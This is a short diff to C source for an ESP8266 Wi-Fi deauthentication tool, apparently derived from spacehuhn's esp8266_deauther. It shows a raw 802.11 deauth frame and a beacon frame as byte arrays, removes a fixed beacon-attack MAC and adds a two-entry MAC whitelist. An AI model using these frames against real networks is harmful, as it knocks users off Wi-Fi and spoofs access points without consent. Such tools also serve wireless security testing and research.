@@ -7,9 +7,6 @@
  * https://github.com/spacehuhn/esp8266_deauther/tree/master/esp8266_deauther
  */
 
-// Random mac for beacon attacks (updated periodically)
-uint8_t beacon_random_mac[6] = { 0xAA, 0xBB, 0xCC, 0x00, 0x11, 0x22 };
-
 uint8_t deauth_packet[26] = {
     /*  0 - 1  */ 0xC0, 0x00,                                       // type, subtype c0: deauth (a0: disassociate)
     /*  2 - 3  */ 0x00, 0x00,                                       // duration (SDK takes care of that)
@@ -96,6 +93,12 @@ uint8_t beacon_packet[109] = {
     /* 101 - 102 */ 0x01, 0x00,
     /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
     /* 107 - 108 */ 0x00, 0x00
+};
+
+uint8_t macs_white_list[2][MAC_ADDR_LEN] =
+{
+    { 0x77, 0xEA, 0x3A, 0x8D, 0xA7, 0xC8 },
+    { 0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF }
 };
 
 bool user_attack_deauth(uint8_t* ap_mac, uint8_t* client_mac, uint8_t reason, uint8_t channel);
